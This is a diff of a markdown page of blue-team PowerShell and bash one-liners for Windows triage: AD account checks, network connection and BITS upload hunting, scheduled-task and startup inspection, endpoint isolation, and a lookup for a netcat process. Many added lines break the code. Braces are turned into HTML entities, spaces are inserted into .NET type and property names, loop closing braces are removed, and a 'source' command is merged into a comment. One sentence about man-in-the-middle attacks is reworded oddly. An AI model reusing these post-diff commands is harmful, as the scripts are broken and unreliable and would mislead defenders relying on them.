@@ -10,11 +10,9 @@ readingTime: "135 min read"
 ---
 
 # Blue Team Notes
-
 > [!IMPORTANT]
 > **Defensive & Authorized Auditing Purposes Only**
 > This note is prepared for educational and authorized defensive diagnostics, infrastructure auditing, and host hardening purposes only. Unauthorised access, penetration tests without written consent, or execution of security commands on external networks is illegal.
-
 Blue T eam Notes
 A collection of one-liners, small scripts, and some useful tips for blue team work.
 I've included screenshots where possible so you know what you're getting.
@@ -25,7 +23,7 @@ donation to one or two charities.
 Donate as much or little money as you like, of course. I have some UK charities you could donate
 to: Great Ormond Street - Children's hospital, Cancer Research, and Feeding Britain - food
 charity
-Ta b l e  o f  C o n t e n t s
+Ta b l e of Contents
 Shell Style
 Windows
 OS Queries
@@ -90,7 +88,6 @@ look to the top-left of the readme you'll see a little icon. This is a small tab
 will help you figure out where you are, where you've been, and where you're going
 As you go through sections, you may notice the arrowhead that says 'section contents'. I have
 nestled the sub-headings in these, to make life a bit easier.
-
 Shell Style
 section contents
 Give shell timestamp
@@ -100,7 +97,7 @@ Pwsh
 ###create a powershell profile, if it doesnt exist already
 New-Item $Profile -ItemType file –Force
 ##open it in notepad to edit
-function prompt{ "[$(Get-Date)]" +" | PS "+ "$(Get-Location) &gt; "}
+function prompt&#123; "[$(Get-Date)]" +" | PS "+ "$(Get-Location) &gt; "&#125;
 ##risky move, need to tighten this up. Change your execution policy or it won't
 #run the profile ps1
 #run as powershell admin
@@ -110,7 +107,7 @@ setx prompt $D$S$T$H$H$H$S$B$S$P$_--$g
 :: $_ and --$g seperate the date/time and path from the actual shell
 :: We make the use of the prompt command: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/prompt
 :: setx is in fact the command line command to write variables to the registery
-:: We are writing the prompt's new timestamp value in the cmd line into the reg so it stays, otherwise it would 
+:: We are writing the prompt's new timestamp value in the cmd line into the reg so it stays, otherwise it would
 Bash
 Windows
 section contents
@@ -119,22 +116,21 @@ endpoints at once.
 OS Queries
 section contents
 Get Fully Qualified Domain Name
-([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname
+([System. Net. Dns]::GetHostByName(($env:computerName))). Hostname
 # Get just domain name
 ##open .bashrc
 sudo nano .bashrc
 #https://www.howtogeek.com/307701/how-to-customize-and-colorize-your-bash-prompt/
 ##date, time, colour, and parent+child directory only, and -&gt; promptt
-PS1='\[\033[00;35m\][`date  +"%d-%b-%y %T %Z"]` ${PWD#"${PWD%/*/*}/"}\n\[\033[01;36m\]-&gt; \[\033[00;37m\]'
+PS1='\[\033[00;35m\][`date  +"%d-%b-%y %T %Z"]` $&#123;PWD#"$&#123;PWD%/*/*&#125;/"&#125;\n\[\033[01;36m\]-&gt; \[\033[00;37m\]'
       ##begin purple  #year,month,day,time,timezone #show last 2 dir #next line, cyan,-&gt;prompt #back to normal white text
-#restart the bash source
-source ~/.bashrc
+#restart the bash source ~/.bashrc
 (Get-WmiObject -Class win32_computersystem).domain
 Get OS and Pwsh info
 This will print out the hostname, the OS build info, and the powershell version
-$Bit = (get-wmiobject Win32_OperatingSystem).OSArchitecture ; 
-$V = $host | select-object -property "Version" ; 
-$Build = (Get-WmiObject -class Win32_OperatingSystem).Caption ; 
+$Bit = (get-wmiobject Win32_OperatingSystem). OSArchitecture ;
+$V = $host | select-object -property "Version" ;
+$Build = (Get-WmiObject -class Win32_OperatingSystem). Caption ;
 write-host "$env:computername is a $Bit $Build with Pwsh $V
 Hardware Info
 If you want, you can get Hardware, BIOS, and Disk Space info of a machine
@@ -146,24 +142,24 @@ gcim -ClassName Win32_Processor | fl caption, Name, SocketDesignation;
 gcim -ClassName Win32_ComputerSystem | fl Manufacturer, Systemfamily, Model, SystemType
 #Disk space in Gigs, as who wants bytes?
 gcim  -ClassName Win32_LogicalDisk |
-Select -Property DeviceID, DriveType, @{L='FreeSpaceGB';E={"{0:N2}" -f ($_.FreeSpace /
+Select -Property DeviceID, DriveType, @&#123;L='FreeSpaceGB';E=&#123;"&#123;0:N2&#125;" -f ($_. FreeSpace /
 ## Let's calculate an individual directory, C:\Sysmon, and compare with disk memory stats
 $size = (gci c:\sysmon | measure Length -s).sum / 1Gb;
 write-host " Sysmon Directory in Gigs: $size";
-$free = gcim  -ClassName Win32_LogicalDisk | select @{L='FreeSpaceGB';E={"{0:N2}" -f (
+$free = gcim  -ClassName Win32_LogicalDisk | select @&#123;L='FreeSpaceGB';E=&#123;"&#123;0:N2&#125;" -f (
 echo "$free";
-$cap = gcim  -ClassName Win32_LogicalDisk | select @{L="Capacity";E={"{0:N2}" -f (
+$cap = gcim  -ClassName Win32_LogicalDisk | select @&#123;L="Capacity";E=&#123;"&#123;0:N2&#125;" -f (
 echo "$cap"
 Time info
 Human Readable
 Get a time that's human readable
-Get-Date -UFormat "%a %Y-%b-%d %T UTC:%Z" 
+Get-Date -UFormat "%a %Y-%b-%d %T UTC:%Z"
 Machine comparable
 This one is great for doing comparisons between two strings of time
 Compare UTC time from Local time
-$Local = get-date;$UTC = (get-date).ToUniversalTime();
+$Local = get-date;$UTC = (get-date). ToUniversalTime();
 write-host "LocalTime is: $Local";write-host "UTC is: $UTC"
-[Xml.XmlConvert]::ToString((Get-Date).ToUniversalTime(), [System.Xml.XmlDateTimeSerializationMode]::Utc) 
+[Xml. XmlConvert]::ToString((Get-Date). ToUniversalTime(), [System. Xml. XmlDateTimeSerializationMode]::Utc)
 Update Info
 Get Patches
 Will show all patch IDs and their installation date
@@ -173,7 +169,7 @@ Sort-Object  -Descending -property InstalledOn|
 format-table -autosize
 Find why an update failed
 $Failures = gwmi -Class Win32_ReliabilityRecords;
-$Failures | ? message -match 'failure'  | Select -ExpandProperty message 
+$Failures | ? message -match 'failure'  | Select -ExpandProperty message
 Manually check if patch has taken
 This happened to me during the March 2021 situation with Microsoft Exchange's ProxyLogon.
 The sysadmin swore blind they had patched the server, but neither systeminfo of get-
@@ -184,7 +180,7 @@ First identify the ID number of the patch you want. And then find the dedicated 
 support page for it.
 For demonstration purposes, let's take KB5001078 and it's corresponding support page. You'll
 be fine just googling the patch ID number.
-Then click into the dropdown relevant to your machine. 
+Then click into the dropdown relevant to your machine.
 Here you can see the files that are included in a particular update. The task now is to pick a
 handful of the patch-files and compare your host machine. See if these files exist too, and if they
 do do they have similar / same dates on the host as they do in the Microsoft patch list?
@@ -212,16 +208,15 @@ Change the AddDays field to more or less days if you want. Right now set to seve
 The 'when Created' field is great for noticing some inconsistencies. For example, how often are
 users created at 2am?
 ​import-module ActiveDirectory;
-$When = ((Get-Date).AddDays(-7)).Date; 
-Get-ADUser -Filter {whenCreated -ge $When} -Properties whenCreated |
-sort whenCreated -descending 
+$When = ((Get-Date). AddDays(-7)). Date;
+Get-ADUser -Filter &#123;whenCreated -ge $When&#125; -Properties whenCreated |
+sort whenCreated -descending
 Hone in on suspicious user
 You can use the SamAccountName above to filter
 ​import-module ActiveDirectory;
 Get-ADUser -Identity HamBurglar -Properties *
 Retrieve local user accounts that are enabled
  Get-LocalUser | ? Enabled -eq "True"
-
 Find all users currently logged in
 qwinsta
 #or
@@ -248,13 +243,12 @@ For local non-domain joined machines
 net user #username #newpass
 net user frank "lFjcVR7fW2-HoDHSyxkzP"
 $user = "lizzie" ; $newPass = "HoDHSyxkzP-cuzjm6S6VF-7rvqKyR";
-#Change password twice. 
+#Change password twice.
 #First can be junk password, second time can be real new password
-Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 
-Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 
+Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText
 Disable AD Account
 #needs the SAMAccountName
-$user = "lizzie"; 
+$user = "lizzie";
 Disable-ADAccount -Identity "$user" #-whatif can be appended
 #check its disabled
 (Get-ADUser -Identity $user).enabled
@@ -271,7 +265,7 @@ Adversaries like to use Machine accounts (accounts that have a $) as these often
 overpowered AND fly under the defenders' radar
 Show machine accounts that are apart of interesting groups.
 There may be misconfigurations that an adversary could take advantadge.
-Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
+Get-ADComputer -Filter * -Properties MemberOf | ? &#123;$_. MemberOf&#125;
 $user = "erochester"
 remove-adgroupmember -identity Administrators -members $User -verbose -confirm:$false
 Reset password for a machine account.
@@ -284,12 +278,11 @@ command only will retrieve the current shell's history, which isn't very useful.
 Instead, PowerShell in Windows 10 saves the last 4096 commands in a particular file. On an
 endpoint, we can run a quick loop that will print the full path of the history file - showing which
 users history it is showing - and then show the contents of that users' PwSh commands
-$Users = (Gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt).FullName
+$Users = (Gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt). FullName
 $Pasts = @($Users);
-foreach ($Past in $Pasts) {
-  write-host "`n----User Pwsh History Path $Past---`n" -ForegroundColor Magenta; 
+foreach ($Past in $Pasts) &#123;
+  write-host "`n----User Pwsh History Path $Past---`n" -ForegroundColor Magenta;
   get-content $Past
-}
 And check this one too
 Service Queries
 section contents
@@ -307,20 +300,20 @@ Hone in on specific Service
 If a specific service catches your eye, you can get all the info for it. Because the single and
 double qoutes are important to getting this right, I find it easier to just put the DisplayName of
 the service I want as a variable, as I tend to fuck up the displayname filter bit
-$Name = "eventlog"; 
+$Name = "eventlog";
 gwmi -Class Win32_Service -Filter "Name = '$Name' " | fl *
 #or this, but you get less information compared to the one about tbh
-get-service -name "eventlog" | fl *   
+get-service -name "eventlog" | fl *
 Kill a service
 Hunting potential sneaky services
 I saw a red team tweet regarding sneaky service install. To identify this, you can deploy the
 following:
 Get-Service -DisplayName "meme_service" | Stop-Service -Force -Confirm:$false -verbose
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
 ft PSChildName, ImagePath -autosize | out-string -width 800
 # Grep out results from System32 to reduce noise, though keep in mind adversaries can just put stuff in there too
-Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
-where ImagePath -notlike "*System32*" | 
+Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" |
+where ImagePath -notlike "*System32*" |
 ft PSChildName, ImagePath -autosize | out-string -width 800
 Network Queries
 section contents
@@ -331,12 +324,12 @@ the process name, and the underlying executable of the process!
 You could just use netstat -b, which gives you SOME of this data
 But instead, try this bad boy on for size:
 Get-NetTCPConnection |
-select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(
+select LocalAddress,localport,remoteaddress,remoteport,state,@&#123;name="process";Expression=&#123;(
 sort Remoteaddress -Descending | ft -wrap -autosize
-#### you can search/filter by the commandline process, but it will come out janky. 
+#### you can search/filter by the commandline process, but it will come out janky.
 ##### in the final field we're searching by `anydesk`
 Get-NetTCPConnection |
-select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(
+select LocalAddress,localport,remoteaddress,remoteport,state,@&#123;name="process";Expression=&#123;(
 |  Select-String -Pattern 'anydesk'
 ######## Bound to catch bad guys or your moneyback guaranteed!!!!
 Find internet established connections, and sort by time established
@@ -347,15 +340,15 @@ Sort-Object -Property creationtime |
 format-table -autosize
 Sort remote IP connections, and then unique them
 This really makes strange IPs stand out
-(Get-NetTCPConnection).remoteaddress | Sort-Object -Unique 
+(Get-NetTCPConnection).remoteaddress | Sort-Object -Unique
 Hone in on a suspicious IP
 If you see suspicious IP address in any of the above, then I would hone in on it
 Show UDP connections
 You can generally filter pwsh UDP the way we did the above TCP
 Get-NetTCPConnection |
-? {($_.RemoteAddress -eq "1.2.3.4")} |
+? &#123;($_. RemoteAddress -eq "1.2.3.4")&#125; |
 select-object -property state, creationtime, localport,remoteport | ft -autosize
-## can do this as well 
+## can do this as well
  Get-NetTCPConnection -remoteaddress 0.0.0.0 |
  select state, creationtime, localport,remoteport | ft -autosize
  Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize
@@ -367,8 +360,8 @@ Check Hosts file
 Some diagnostic agent may attempt DNS hijacking, and alter your Hosts file
 Check Host file Time
 Don't trust timestamps....however, may be interesting to see if altered recently
-gci "C:\Windows\System32\Drivers\etc\hosts" | fl *Time* 
-stop-process -verbose -force -Confirm:$false (Get-Process -Id (Get-NetTCPConnection -RemoteAddress 
+gci "C:\Windows\System32\Drivers\etc\hosts" | fl *Time*
+stop-process -verbose -force -Confirm:$false (Get-Process -Id (Get-NetTCPConnection -RemoteAddress
 gc -tail 4 "C:\Windows\System32\Drivers\etc\hosts"
 #the above gets the most important bit of the hosts file. If you want more, try this:
 gc "C:\Windows\System32\Drivers\etc\hosts"
@@ -388,14 +381,14 @@ Be careful though. If you are too generic and liberal, you may end up filtering 
 important results. It's bettter to be a bit specific, and drill down further to amake sure you aren't
 filtering out important info. So for example, I wouldn't suggest filtering out short combos of
 letters or numbers ae|ou|34|
-Get-DnsClientCache | 
+Get-DnsClientCache |
 ? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" |
-out-string -width 1000  
+out-string -width 1000
 If there's an IP you're sus of, you can always take it to WHOIS or VirusTotal, as well see for other
 instances it appears in your network and what's up to whilst it's interacting there.
 IPv6
 Since Windows Vitsa, the Windows OS prioritises IPv6 over IPv4. This lends itself to man-in-the-
-middle attacks, you can find some more info on exploitation here
+middle security test, you can find some more info on defensive validation here
 Get IPv6 addresses and networks
 Get-NetIPAddress -AddressFamily IPv6  | ft Interfacealias, IPv6Address
 Disable Priority Treatment of IPv6
@@ -406,21 +399,20 @@ BITS Queries
 #check if machine prioritises IPv6
 ping $env:COMPUTERNAME -n 4 # if this returns an IPv6, the machine prioritises this over IPv4
 #Reg changes to de-prioritise IPv6
-New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 
+New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value
 #If this reg already exists and has values, change the value
-Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 
+Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value
 #you need to restart the computer for this to take affect
 #Restart-Computer
-Get-BitsTransfer| 
+Get-BitsTransfer|
 fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime
-
 ## filter out common bits jobs in your enviro, ones below are just an example, you will need to add your own context
 Get-BitsTransfer|
 | ? displayname -notmatch "WU|Office|Dell_Asimov|configjson" |
 fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime
 ## Hunt down BITS transfers that are UPLOADING, which may be sign of data exfil
-Get-BitsTransfer| 
-? TransferType -match "Upload" | 
+Get-BitsTransfer|
+? TransferType -match "Upload" |
 fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime
 Remoting Queries
 section contents
@@ -429,23 +421,22 @@ Get Powershell sessions created
 Get-PSSession
 Query WinRM Sessions Deeper
 You can query the above even deeper.
-get-wsmaninstance -resourceuri shell -enumerate | 
-select Name, State, Owner, ClientIP, ProcessID, MemoryUsed, 
-@{Name = "ShellRunTime"; Expression = {[System.Xml.XmlConvert]::ToTimeSpan($_.ShellRunTime)}},
-@{Name = "ShellInactivity"; Expression = {[System.Xml.XmlConvert]::ToTimeSpan($_.ShellInactivity)}}
+get-wsmaninstance -resourceuri shell -enumerate |
+select Name, State, Owner, ClientIP, ProcessID, MemoryUsed,
+@&#123;Name = "ShellRunTime"; Expression = &#123;[System. Xml. XmlConvert]::ToTimeSpan($_. ShellRunTime)&#125;&#125;,
+@&#123;Name = "ShellInactivity"; Expression = &#123;[System. Xml. XmlConvert]::ToTimeSpan($_. ShellInactivity)&#125;&#125;
 The ClientIP field will show the original IP address that WinRM'd to the remote machine. The
 times under the Shell fields at the bottom have been converted into HH:MM:SS, so in the above
 example, the remote PowerShell session has been running for 0 hours, 4 minutes, and 26
 seconds.
 Remoting Permissions
-Get-PSSessionConfiguration | 
+Get-PSSessionConfiguration |
 fl Name, PSVersion, Permission
 Check Constrained Language
 To be honest, constrained language mode in Powershell can be trivally easy to mitigate for an
 adversary. And it's difficult to implement persistently. But anyway. You can use this quick
 variable to confirm if a machine has a constrained language mode for pwsh.
-$ExecutionContext.SessionState.LanguageMode
-
+$ExecutionContext. SessionState. LanguageMode
 RDP settings
 You can check if RDP capability is permissioned on an endpoint
 If you want to block RDP
@@ -461,18 +452,18 @@ credentials!!!
 Two logs of interest
 Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
 Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
-if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections 
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 
+if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name
 #Firewall it out too
 Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
 # if you acquire a log, change this to get-winevent -path ./RDP_log_you_acquired.evtx
 get-winevent -path "./Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx"
-? id -match 1149 | 
-sort Time* -descending | 
+? id -match 1149 |
+sort Time* -descending |
 fl time*, message
 get-winevent -path ./ "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx"
-? id -match 21 | 
-sort Time* -descending | 
+? id -match 21 |
+sort Time* -descending |
 fl time*, message
 Current RDP Sessions
 You can query the RDP sessions that a system is currently running
@@ -482,12 +473,11 @@ qwinsta /counter
 You can read here about how to evict a malicious user from a session and change the creds
 rapidly to deny them future access
 Check Certificates
-gci "cert:\" -recurse | fl FriendlyName, Subject, Not* 
+gci "cert:\" -recurse | fl FriendlyName, Subject, Not*
 Certificate Dates
 You will be dissapointed how many certificates are expired but still in use. Use the -
 ExpiringInDays flag
- gci "cert:\*" -recurse -ExpiringInDays 0 | fl FriendlyName, Subject, Not*  
-
+ gci "cert:\*" -recurse -ExpiringInDays 0 | fl FriendlyName, Subject, Not*
 Firewall Queries
 section contents
 Retrieve Firewall profile names
@@ -508,7 +498,7 @@ Get-NetFirewallRule | ? direction -eq "inbound"
 #or outbound
 Get-NetFirewallRule | ? direction -eq "outbound"
 ##stack these filters
-Get-NetFirewallRule | where {($_.Enabled -eq "true" -and $_.Direction -eq "inbound"
+Get-NetFirewallRule | where &#123;($_. Enabled -eq "true" -and $_. Direction -eq "inbound"
 #or just use the built in flags lol
 Get-NetFirewallRule -Enabled True -Direction Inbound
 Isolate Endpoint
@@ -519,18 +509,17 @@ SMB Queries
 section contents
 List Shares
   Get-SMBShare
-New-NetFirewallRule -DisplayName "Block all outbound traffic" -Direction Outbound -Action Block | 
-New-NetFirewallRule -DisplayName "Block all inbound traffic" -Direction Inbound -Action Block | 
-$adapter = Get-NetAdapter|foreach { $_.Name } ; Disable-NetAdapter -Name "$adapter
-Add-Type -AssemblyName PresentationCore,PresentationFramework; 
-[System.Windows.MessageBox]::Show('Your Computer has been Disconnected from the Internet for Security Issues. Please do not try to re-connect to the internet. Contact Security Helpdesk Desk '
+New-NetFirewallRule -DisplayName "Block all outbound traffic" -Direction Outbound -Action Block |
+New-NetFirewallRule -DisplayName "Block all inbound traffic" -Direction Inbound -Action Block |
+$adapter = Get-NetAdapter|foreach &#123; $_. Name &#125; ; Disable-NetAdapter -Name "$adapter
+Add-Type -AssemblyName PresentationCore,PresentationFramework;
+[System. Windows. MessageBox]::Show('Your Computer has been Disconnected from the Internet for Security Issues. Please do not try to re-connect to the internet. Contact Security Helpdesk Desk '
 List client-to-server SMB Connections
 Dialect just means verison. SMB3, SMB2 etc
 Get-SmbConnection
-
 #just show SMB Versions being used. Great for enumeration flaws in enviro - i.e, smb1 being used somewhere
 Get-SmbConnection |
-select Dialect, Servername, Sharename | sort Dialect   
+select Dialect, Servername, Sharename | sort Dialect
 Remove an SMB Share
 Remove-SmbShare -Name MaliciousShare -Confirm:$false -verbose
 Process Queries
@@ -539,54 +528,53 @@ Processes and TCP Connections
 I have a neat one-liner for you. This will show you the local IP and port, the remote IP andport,
 the process name, and the underlying executable of the process!
 You could just use netstat -b, which gives you SOME of this data
-
 But instead, try this bad boy on for size:
 Show all processes and their associated user
 get-process * -Includeusername
 Try this one if you're hunting down suspicious processes from users
-gwmi win32_process | 
-Select Name,@{n='Owner';e={$_.GetOwner().User}},CommandLine | 
+gwmi win32_process |
+Select Name,@&#123;n='Owner';e=&#123;$_. GetOwner(). User&#125;&#125;,CommandLine |
 sort Name -unique -descending | Sort Owner | ft -wrap -autosize
 Get-NetTCPConnection |
-select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(
+select LocalAddress,localport,remoteaddress,remoteport,state,@&#123;name="process";Expression=&#123;(
 sort Remoteaddress -Descending | ft -wrap -autosize
 Get specific info about the full path binary that a process is running
-gwmi win32_process | 
-Select Name,ProcessID,@{n='Owner';e={$_.GetOwner().User}},CommandLine | 
+gwmi win32_process |
+Select Name,ProcessID,@&#123;n='Owner';e=&#123;$_. GetOwner(). User&#125;&#125;,CommandLine |
 sort name | ft -wrap -autosize | out-string
 Get specific info a process is running
-get-process -name "nc" | ft Name, Id, Path,StartTime,Includeusername -autosize 
+get-process -name "nc" | ft Name, Id, Path,StartTime,Includeusername -autosize
 Is a specific process a running on a machine or not
-Example of process that is absent 
-Example of process that is present 
+Example of process that is absent
+Example of process that is present
 Get process hash
 Great to make malicious process stand out. If you want a different Algorithm, just change it after
 -Algorithm to something like sha256
-foreach ($proc in Get-Process | select path -Unique){try
-{ Get-FileHash $proc.path -Algorithm sha256 -ErrorAction stop |
-ft hash, path -autosize -HideTableHeaders | out-string -width 800 }catch{}}
+foreach ($proc in Get-Process | select path -Unique)&#123;try
+&#123; Get-FileHash $proc.path -Algorithm sha256 -ErrorAction stop |
+ft hash, path -autosize -HideTableHeaders | out-string -width 800 &#125;catch&#123;&#125;&#125;
 $process = "memes";
-if (ps |  where-object ProcessName -Match "$process") {Write-Host "$process successfully installed on "
+if (ps |  where-object ProcessName -Match "$process") &#123;Write-Host "$process successfully installed on "
 Show all DLLs loaded with a process
-get-process -name "memestask" -module 
+get-process -name "memestask" -module
 Alternatively, pipe |fl and it will give a granularity to the DLLs
 Identify process CPU usage
- (Get-Process -name "googleupdate").CPU | fl 
+ (Get-Process -name "googleupdate"). CPU | fl
 I get mixed results with this command but it's supposed to give the percent of CPU usage. I
 need to work on this, but I'm putting it in here so the world may bare wittness to my smooth
 brain.
-$ProcessName = "symon" ; 
-$ProcessName = (Get-Process -Id $ProcessPID).Name; 
+$ProcessName = "symon" ;
+$ProcessName = (Get-Process -Id $ProcessPID). Name;
 Sort by least CPU-intensive processes
 Right now will show the lower cpu-using proccesses...useful as malicious process probably
 won't be as big a CPU as Chrome, for example. But change first line to Sort CPU -descending
 if you want to see the chungus processes first
 gps | Sort CPU |
-Select -Property ProcessName, CPU, ID, StartTime | 
+Select -Property ProcessName, CPU, ID, StartTime |
 ft -autosize -wrap | out-string -width 800
-$CpuCores = (Get-WMIObject Win32_ComputerSystem).NumberOfLogicalProcessors; 
-$Samples = (Get-Counter "\Process($Processname*)\% Processor Time").CounterSamples; 
-$Samples | Select `InstanceName,@{Name="CPU %";Expression={[Decimal]::Round(($_.CookedValue / 
+$CpuCores = (Get-WMIObject Win32_ComputerSystem). NumberOfLogicalProcessors;
+$Samples = (Get-Counter "\Process($Processname*)\% Processor Time"). CounterSamples;
+$Samples | Select `InstanceName,@{Name="CPU %";Expression={[Decimal]::Round(($_. CookedValue /
 Stop a Process
 Get-Process -Name "memeprocess" | Stop-Process -Force -Confirm:$false -verbose
 Process Tree
@@ -598,15 +586,15 @@ Get scheduled tasks
 Identify the user behind a command too. Great at catching out malicious schtasks that perhaps
 are imitating names, or a process name
 schtasks /query /FO CSV /v | convertfrom-csv |
-where { $_.TaskName -ne "TaskName" } |
-select "TaskName","Run As User", Author, "Task to Run"| 
+where &#123; $_. TaskName -ne "TaskName" &#125; |
+select "TaskName","Run As User", Author, "Task to Run"|
 fl | out-string
 Get a specific schtask
 Get-ScheduledTask -Taskname "wifi*" | fl *
 To find the commands a task is running
 Great one liner to find exactly WHAT a regular task is doing
-$task = Get-ScheduledTask | where TaskName -EQ "meme task"; 
-$task.Actions
+$task = Get-ScheduledTask | where TaskName -EQ "meme task";
+$task. Actions
 And a command to get granularity behind the schtask requires you to give the taskpath. Tasks
 with more than one taskpath will throw an error here
 To stop the task
@@ -621,7 +609,7 @@ You can compare the above for tasks missing from the C:\Windows directories, but
 the Registry.
 $task = "CacheTask";
 get-scheduledtask -taskpath (Get-ScheduledTask -Taskname "$task").taskpath | Export-ScheduledTask
-#this isn't the way the microsoft docs advise. 
+#this isn't the way the microsoft docs advise.
      ##But I prefer this, as it means I don't need to go and get the taskpath when I already know the taskname
 Get-ScheduledTask "memetask" | Stop-ScheduledTask -Force -Confirm:$false -verbose
 Sneaky Schtasks via the Registry
@@ -634,7 +622,7 @@ Shout out to my man @themalwareguy for the $fixedstring line that regexes in/out
 characters.
 # From my man Anthony Smith - https://www.linkedin.com/in/anthony-c-smith/
 $Reg=(Get-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\tree\*"
-$XMLs = (ls C:\windows\System32\Tasks\).Name
+$XMLs = (ls C:\windows\System32\Tasks\). Name
 Compare-Object $Reg $XMLs
 # the schtask for our example
 # schtasks /create /tn "Find_Me" /tr calc.exe /sc minute /mo 100 /k
@@ -642,30 +630,29 @@ Compare-Object $Reg $XMLs
   ## Parses Actions to show the underlying binary / commands for the schtask
   ## Could replace Actions with Trigggers on line 10, after ExpandedProperty
 (Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\*"
-Foreach-Object {
+Foreach-Object &#123;
   write-host "----Schtask ID is $_---" -ForegroundColor Magenta ;
   $hexstring = Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\
-  $fixedstring = [System.Text.Encoding]::Unicode.GetString($hexstring) -replace '[^a-zA-Z0-9\\._\-\:\%\/\$ ]'
+  $fixedstring = [System. Text. Encoding]::Unicode. GetString($hexstring) -replace '[^a-zA-Z0-9\\._\-\:\%\/\$ ]'
   write-host $fixedstring
-}
 If you don't need to loop to search, because you know what you're gunning for then you can just
 deploy this
 Once you've deployed the above loop, and zoned in on a binary / one-liner that seems sus, you
 can query it in the other Registry location
-$hexstring = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\{ID}"
-Select -ExpandProperty Actions) -join ',' ; $hexstring.Split(" ")
-## can then go to cyberchef, and convert From Decimal with the comma (,) delimineter 
+$hexstring = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\&#123;ID&#125;"
+Select -ExpandProperty Actions) -join ',' ; $hexstring. Split(" ")
+## can then go to cyberchef, and convert From Decimal with the comma (,) delimineter
 # Then for the ID of interest under \Taskcache\Tree subkey
-  # Example: $ID = "{8E350038-3475-413A-A1AE-20711DD11C95}" ;  
-$ID = "{XYZ}" ; 
+  # Example: $ID = "&#123;8E350038-3475-413A-A1AE-20711DD11C95&#125;" ;
+$ID = "&#123;XYZ&#125;" ;
 get-itemproperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree\*"
 ? Id -Match "$ID" | fl *Name,Id,PsPath
 And then eradicating these Registry schtask entries is straight forward via Regedit's GUI, that
 way you have no permission problems. Delete both:
-HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\{$ID}
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\&#123;$ID&#125;
 HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree\$Name
 Show what programs run at startup
-Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | 
+Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User |
 Some direct path locations too can be checked
 HKLM\software\classes\exefile\shell\open\command
 c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup
@@ -673,24 +660,24 @@ Querying that last one in more detail, you have some interesting options
 #Just list out the files in each user's startup folder
 (gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname
 #Extract from the path User, Exe, and print machine name
-(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname | 
-foreach-object {$data = $_.split("\\");write-output "$($data[2]), $($data[10]), $(hostname)"
+(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname |
+foreach-object &#123;$data = $_.split("\\");write-output "$($data[2]), $($data[10]), $(hostname)"
 #Check the first couple lines of files' contents
-(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname | 
-foreach-object {write-host `n$_`n; gc $_ -encoding byte| fhx |select -first 5}
+(gci "c:\Users\*\appdata\roaming\microsoft\windows\start menu\programs\startup\*").fullname |
+foreach-object &#123;write-host `n$_`n; gc $_ -encoding byte| fhx |select -first 5&#125;
 Programs at login
 Adversaries can link persistence mechanisms to be activated to a users' login via the registry
